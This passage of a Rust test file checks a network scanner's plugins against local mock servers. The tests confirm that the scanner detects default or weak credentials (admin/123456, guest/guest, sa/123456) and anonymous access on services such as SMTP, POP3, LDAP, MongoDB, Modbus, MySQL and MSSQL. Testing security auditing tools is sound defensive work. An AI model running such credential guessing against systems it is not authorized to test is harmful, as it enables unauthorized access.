            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "smtp");
    assert_eq!(findings[0].status, "anonymous-access");
    assert_eq!(findings[0].details["anonymous"], json!(true));
}

#[test]
fn detects_smtp_anonymous_access_over_tls_fallback() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    listener
        .set_nonblocking(true)
        .expect("listener should become nonblocking");
    let config = tls_test_config();

    let server = thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(3);
        while Instant::now() < deadline {
            match listener.accept() {
                Ok((stream, _)) => {
                    stream
                        .set_read_timeout(Some(Duration::from_secs(1)))
                        .expect("read timeout should set");
                    stream
                        .set_write_timeout(Some(Duration::from_secs(1)))
                        .expect("write timeout should set");
                    let conn =
                        ServerConnection::new(config.clone()).expect("server conn should build");
                    let mut tls = StreamOwned::new(conn, stream);
                    if !complete_server_tls_handshake(&mut tls, deadline) {
                        continue;
                    }

                    tls.write_all(b"220 mail.example ESMTP ready\r\n")
                        .expect("banner should write");
                    let mut buffer = [0u8; 1024];

                    let size = tls.read(&mut buffer).expect("ehlo should read");
                    let request = String::from_utf8_lossy(&buffer[..size]);
                    assert!(request.contains("EHLO rscan"));
                    tls.write_all(b"250-mail.example\r\n250 AUTH PLAIN\r\n")
                        .expect("ehlo response should write");

                    let size = tls.read(&mut buffer).expect("mail from should read");
                    let request = String::from_utf8_lossy(&buffer[..size]);
                    assert!(request.contains("MAIL FROM:<test@test.com>"));
                    tls.write_all(b"250 OK\r\n")
                        .expect("mail response should write");
                    tls.flush().expect("response should flush");
                    return;
                }
                Err(error) if error.kind() == ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(20));
                }
                Err(error) => panic!("accept failed: {error}"),
            }
        }
        panic!("timed out waiting for TLS SMTP request");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "smtp",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "smtp");
    assert_eq!(findings[0].status, "anonymous-access");
    assert_eq!(findings[0].details["anonymous"], json!(true));
}

#[test]
fn detects_pop3_weak_password_with_default_dictionary() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        stream
            .write_all(b"+OK POP3 ready\r\n")
            .expect("banner should write");
        let mut buffer = [0u8; 1024];

        let size = stream.read(&mut buffer).expect("user should read");
        let request = String::from_utf8_lossy(&buffer[..size]);
        assert!(request.contains("USER admin"));
        stream
            .write_all(b"+OK user accepted\r\n")
            .expect("user response should write");

        let size = stream.read(&mut buffer).expect("pass should read");
        let request = String::from_utf8_lossy(&buffer[..size]);
        assert!(request.contains("PASS 123456"));
        stream
            .write_all(b"+OK mailbox locked and ready\r\n")
            .expect("pass response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "pop3",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "pop3");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("123456"));
    assert_eq!(findings[0].details["tls"], json!(false));
}

#[test]
fn detects_pop3_weak_password_over_tls_fallback() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    listener
        .set_nonblocking(true)
        .expect("listener should become nonblocking");
    let config = tls_test_config();

    let server = thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(2);
        while Instant::now() < deadline {
            match listener.accept() {
                Ok((stream, _)) => {
                    stream
                        .set_read_timeout(Some(Duration::from_secs(1)))
                        .expect("read timeout should set");
                    stream
                        .set_write_timeout(Some(Duration::from_secs(1)))
                        .expect("write timeout should set");
                    let conn =
                        ServerConnection::new(config.clone()).expect("server conn should build");
                    let mut tls = StreamOwned::new(conn, stream);
                    if !complete_server_tls_handshake(&mut tls, deadline) {
                        continue;
                    }
                    tls.write_all(b"+OK POP3 ready\r\n")
                        .expect("banner should write");
                    let mut buffer = [0u8; 1024];

                    let size = tls.read(&mut buffer).expect("user should read");
                    let request = String::from_utf8_lossy(&buffer[..size]);
                    assert!(request.contains("USER admin"));
                    tls.write_all(b"+OK user accepted\r\n")
                        .expect("user response should write");

                    let size = tls.read(&mut buffer).expect("pass should read");
                    let request = String::from_utf8_lossy(&buffer[..size]);
                    assert!(request.contains("PASS 123456"));
                    tls.write_all(b"+OK mailbox locked and ready\r\n")
                        .expect("pass response should write");
                    tls.flush().expect("response should flush");
                    return;
                }
                Err(error) if error.kind() == ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(20));
                }
                Err(error) => panic!("accept failed: {error}"),
            }
        }
        panic!("timed out waiting for TLS POP3 request");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "pop3",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "pop3");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("123456"));
    assert_eq!(findings[0].details["tls"], json!(true));
}

#[test]
fn detects_imap_weak_password_with_default_dictionary() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        stream
            .write_all(b"* OK IMAP ready\r\n")
            .expect("banner should write");
        let mut buffer = [0u8; 1024];

        let size = stream.read(&mut buffer).expect("login should read");
        let request = String::from_utf8_lossy(&buffer[..size]);
        assert!(request.contains("a001 LOGIN \"admin\" \"123456\""));
        stream
            .write_all(b"a001 OK LOGIN completed\r\n")
            .expect("login response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "imap",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "imap");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_imap_weak_password_over_tls_fallback() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    listener
        .set_nonblocking(true)
        .expect("listener should become nonblocking");
    let config = tls_test_config();

    let server = thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(2);
        while Instant::now() < deadline {
            match listener.accept() {
                Ok((stream, _)) => {
                    stream
                        .set_read_timeout(Some(Duration::from_secs(1)))
                        .expect("read timeout should set");
                    stream
                        .set_write_timeout(Some(Duration::from_secs(1)))
                        .expect("write timeout should set");
                    let conn =
                        ServerConnection::new(config.clone()).expect("server conn should build");
                    let mut tls = StreamOwned::new(conn, stream);
                    if !complete_server_tls_handshake(&mut tls, deadline) {
                        continue;
                    }
                    tls.write_all(b"* OK IMAP ready\r\n")
                        .expect("banner should write");
                    let mut buffer = [0u8; 1024];

                    let size = tls.read(&mut buffer).expect("login should read");
                    let request = String::from_utf8_lossy(&buffer[..size]);
                    assert!(request.contains("a001 LOGIN \"admin\" \"123456\""));
                    tls.write_all(b"a001 OK LOGIN completed\r\n")
                        .expect("login response should write");
                    tls.flush().expect("response should flush");
                    return;
                }
                Err(error) if error.kind() == ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(20));
                }
                Err(error) => panic!("accept failed: {error}"),
            }
        }
        panic!("timed out waiting for TLS IMAP request");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "imap",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "imap");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_activemq_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 2048];
        let size = stream.read(&mut buffer).expect("frame should read");
        let request = String::from_utf8_lossy(&buffer[..size]);
        assert!(request.contains("login:admin"));
        assert!(request.contains("passcode:admin"));
        stream
            .write_all(b"CONNECTED\nversion:1.2\n\n\x00")
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "activemq",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "activemq");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("admin"));
}

#[test]
fn detects_rsync_anonymous_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut list_stream, _) = listener.accept().expect("list request should arrive");
        list_stream
            .write_all(b"@RSYNCD: 31.0\n")
            .expect("greeting should write");
        let mut buffer = [0u8; 1024];
        let mut transcript = String::new();
        while !transcript.contains("#list") {
            let size = list_stream
                .read(&mut buffer)
                .expect("list command should read");
            transcript.push_str(&String::from_utf8_lossy(&buffer[..size]));
        }
        assert!(transcript.contains("@RSYNCD: 31.0"));
        assert!(transcript.contains("#list"));
        list_stream
            .write_all(b"public\tPublic module\n@RSYNCD: EXIT\n")
            .expect("module list should write");

        let (mut auth_stream, _) = listener.accept().expect("auth request should arrive");
        auth_stream
            .write_all(b"@RSYNCD: 31.0\n")
            .expect("auth greeting should write");
        transcript.clear();
        while !transcript.contains("public") {
            let size = auth_stream.read(&mut buffer).expect("module should read");
            transcript.push_str(&String::from_utf8_lossy(&buffer[..size]));
        }
        assert!(transcript.contains("@RSYNCD: 31.0"));
        assert!(transcript.contains("public"));
        auth_stream
            .write_all(b"@RSYNCD: OK\n")
            .expect("ok should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "rsync",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "rsync");
    assert_eq!(findings[0].status, "anonymous-access");
    assert_eq!(findings[0].details["module"], json!("public"));
}

#[test]
fn detects_rabbitmq_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 2048];
        let _ = stream.read(&mut buffer);
        let body = r#"{"management_version":"3.13"}"#;
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            body
        );
        stream
            .write_all(response.as_bytes())
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "rabbitmq",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "rabbitmq");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("guest"));
    assert_eq!(findings[0].details["password"], json!("guest"));
}

#[test]
fn detects_mongodb_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 2048];
        let size = stream.read(&mut buffer).expect("request should read");
        assert!(size > 16);
        assert_eq!(&buffer[12..16], &[0xdd, 0x07, 0x00, 0x00]);
        stream
            .write_all(b"\x7f\x00\x00\x00totalLinesWritten")
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "mongodb",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "mongodb");
    assert_eq!(findings[0].status, "unauthorized-access");
    assert_eq!(findings[0].details["service"], json!("mongodb"));
    assert_eq!(findings[0].details["type"], json!("unauthorized-access"));
}

#[test]
fn detects_modbus_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 64];
        let size = stream.read(&mut buffer).expect("request should read");
        assert_eq!(&buffer[..size], modbus_request_packet().as_slice());
        stream
            .write_all(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x01, 0x01, 0x01, 0x01])
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "modbus",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "modbus");
    assert_eq!(findings[0].status, "unauthorized-access");
    assert_eq!(findings[0].details["service"], json!("modbus"));
    assert_eq!(
        findings[0].details["device_info"],
        json!("Unit ID: 1, Function: 0x01, Coil Status: 1")
    );
}

#[test]
fn detects_ldap_anonymous_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 1024];

        let size = stream.read(&mut buffer).expect("bind should read");
        let request = &buffer[..size];
        assert!(request.windows(3).any(|window| window == b"\x02\x01\x03"));
        stream
            .write_all(&[
                0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00,
            ])
            .expect("bind response should write");

        let size = stream.read(&mut buffer).expect("search should read");
        let request = &buffer[..size];
        assert!(request.contains(&0x63));
        stream
            .write_all(&[
                0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00,
            ])
            .expect("search response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ldap",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ldap");
    assert_eq!(findings[0].status, "anonymous-access");
    assert_eq!(findings[0].details["service"], json!("ldap"));
    assert_eq!(findings[0].details["type"], json!("anonymous-access"));
}

#[test]
fn detects_ldap_anonymous_access_over_tls_fallback() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    listener
        .set_nonblocking(true)
        .expect("listener should become nonblocking");
    let config = tls_test_config();

    let server = thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(3);
        while Instant::now() < deadline {
            match listener.accept() {
                Ok((stream, _)) => {
                    stream
                        .set_read_timeout(Some(Duration::from_secs(1)))
                        .expect("read timeout should set");
                    stream
                        .set_write_timeout(Some(Duration::from_secs(1)))
                        .expect("write timeout should set");
                    let conn =
                        ServerConnection::new(config.clone()).expect("server conn should build");
                    let mut tls = StreamOwned::new(conn, stream);
                    if !complete_server_tls_handshake(&mut tls, deadline) {
                        continue;
                    }

                    let mut buffer = [0u8; 1024];
                    let size = tls.read(&mut buffer).expect("bind should read");
                    let request = &buffer[..size];
                    assert!(request.windows(3).any(|window| window == b"\x02\x01\x03"));
                    tls.write_all(&[
                        0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00,
                        0x04, 0x00,
                    ])
                    .expect("bind response should write");

                    let size = tls.read(&mut buffer).expect("search should read");
                    let request = &buffer[..size];
                    assert!(request.contains(&0x63));
                    tls.write_all(&[
                        0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00,
                        0x04, 0x00,
                    ])
                    .expect("search response should write");
                    tls.flush().expect("response should flush");
                    return;
                }
                Err(error) if error.kind() == ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(20));
                }
                Err(error) => panic!("accept failed: {error}"),
            }
        }
        panic!("timed out waiting for TLS LDAP request");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ldap",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ldap");
    assert_eq!(findings[0].status, "anonymous-access");
    assert_eq!(findings[0].details["service"], json!("ldap"));
    assert_eq!(findings[0].details["type"], json!("anonymous-access"));
}

#[test]
fn detects_ldap_weak_password_with_default_dictionary() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut anonymous_stream, _) = listener.accept().expect("anonymous request should arrive");
        let mut buffer = [0u8; 2048];
        let _ = anonymous_stream
            .read(&mut buffer)
            .expect("anonymous bind should read");
        anonymous_stream
            .write_all(&[
                0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x31, 0x04, 0x00, 0x04, 0x00,
            ])
            .expect("failure should write");

        let (mut weak_stream, _) = listener
            .accept()
            .expect("weak password request should arrive");
        let size = weak_stream.read(&mut buffer).expect("bind should read");
        let request = String::from_utf8_lossy(&buffer[..size]);
        assert!(request.contains("cn=admin,dc=example,dc=com"));
        assert!(request.contains("123456"));
        weak_stream
            .write_all(&[
                0x30, 0x0c, 0x02, 0x01, 0x01, 0x61, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00,
            ])
            .expect("bind success should write");

        let _ = weak_stream.read(&mut buffer).expect("search should read");
        weak_stream
            .write_all(&[
                0x30, 0x0c, 0x02, 0x01, 0x02, 0x65, 0x07, 0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00,
            ])
            .expect("search response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ldap",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ldap");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("admin"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_snmp_weak_community() {
    assert_eq!(
        parse_snmp_response(&snmp_test_response("public", "Mock SNMP")),
        Some("Mock SNMP".to_string())
    );

    let socket = UdpSocket::bind("127.0.0.1:0").expect("socket should bind");
    let port = socket.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let mut buffer = [0u8; 2048];
        let (size, peer) = socket
            .recv_from(&mut buffer)
            .expect("request should arrive");
        assert!(size > 0);
        socket
            .send_to(&snmp_test_response("public", "Mock SNMP"), peer)
            .expect("response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "snmp",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "snmp");
    assert_eq!(findings[0].status, "weak-community");
    assert_eq!(findings[0].details["community"], json!("public"));
    assert_eq!(findings[0].details["system"], json!("Mock SNMP"));
}

#[test]
fn detects_neo4j_default_credentials() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut noauth_stream, _) = listener.accept().expect("noauth request should arrive");
        respond_neo4j_handshake(&mut noauth_stream, false).expect("noauth flow should complete");

        let (mut default_stream, _) = listener.accept().expect("default request should arrive");
        respond_neo4j_handshake(&mut default_stream, true).expect("default flow should complete");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "neo4j",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "neo4j");
    assert_eq!(findings[0].status, "default-credentials");
    assert_eq!(findings[0].details["username"], json!("neo4j"));
    assert_eq!(findings[0].details["password"], json!("neo4j"));
}

#[test]
fn detects_neo4j_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        respond_neo4j_handshake(&mut stream, true).expect("flow should complete");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "neo4j",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "neo4j");
    assert_eq!(findings[0].status, "unauthorized-access");
}

#[test]
fn detects_cassandra_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let startup = cassandra_read_frame(&mut stream).expect("startup should read");
        assert_eq!(startup.opcode, 0x01);
        stream
            .write_all(&cassandra_frame(0x84, 0x02, &[]))
            .expect("ready should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "cassandra",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "cassandra");
    assert_eq!(findings[0].status, "unauthorized-access");
}

#[test]
fn detects_cassandra_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut anonymous_stream, _) = listener.accept().expect("anonymous request should arrive");
        let startup = cassandra_read_frame(&mut anonymous_stream).expect("startup should read");
        assert_eq!(startup.opcode, 0x01);
        anonymous_stream
            .write_all(&cassandra_frame(0x84, 0x03, &[]))
            .expect("authenticate should write");

        let (mut weak_stream, _) = listener.accept().expect("weak request should arrive");
        let startup = cassandra_read_frame(&mut weak_stream).expect("startup should read");
        assert_eq!(startup.opcode, 0x01);
        weak_stream
            .write_all(&cassandra_frame(0x84, 0x03, &[]))
            .expect("authenticate should write");
        let auth = cassandra_read_frame(&mut weak_stream).expect("auth should read");
        assert_eq!(auth.opcode, 0x0F);
        let payload = &auth.body[4..];
        assert!(payload.windows(9).any(|window| window == b"cassandra"));
        assert!(payload.windows(6).any(|window| window == b"123456"));
        weak_stream
            .write_all(&cassandra_frame(0x84, 0x10, &[]))
            .expect("auth success should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "cassandra",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "cassandra");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("cassandra"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_mysql_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        mysql_write_packet(&mut stream, 0, &mysql_handshake()).expect("handshake should write");
        let response = mysql_read_packet(&mut stream).expect("response should read");
        assert!(response.windows(5).any(|window| window == b"root\0"));
        stream
            .write_all(&[
                0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            ])
            .expect("ok should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "mysql",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "mysql");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("root"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_mssql_weak_password() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let prelogin = mssql_read_message(&mut stream).expect("prelogin should read");
        assert_eq!(prelogin, mssql_prelogin_message());
        mssql_write_packet(&mut stream, 0x04, 1, &mssql_prelogin_message())
            .expect("prelogin response should write");

        let login = mssql_read_message(&mut stream).expect("login should read");
        assert_eq!(mssql_login_username(&login), Some("sa".to_string()));
        assert_eq!(mssql_login_password(&login), Some("123456".to_string()));
        mssql_write_packet(&mut stream, 0x04, 1, &mssql_login_ack_payload())
            .expect("login ack should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "mssql",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "mssql");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["service"], json!("mssql"));
    assert_eq!(findings[0].details["username"], json!("sa"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_oracle_weak_password_with_mock_connector() {
    let mut attempts = Vec::new();
    let finding = scan_oracle_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 1521,
        },
        &PluginContext {
            usernames: vec!["admin".to_string()],
            passwords: vec!["{user}@123".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, password, service_name, _| {
            attempts.push((
                username.to_string(),
                password.to_string(),
                service_name.to_string(),
            ));
            Ok(username == "ADMIN" && password == "admin@123" && service_name == "ORCL")
        },
    )
    .expect("scan should succeed")
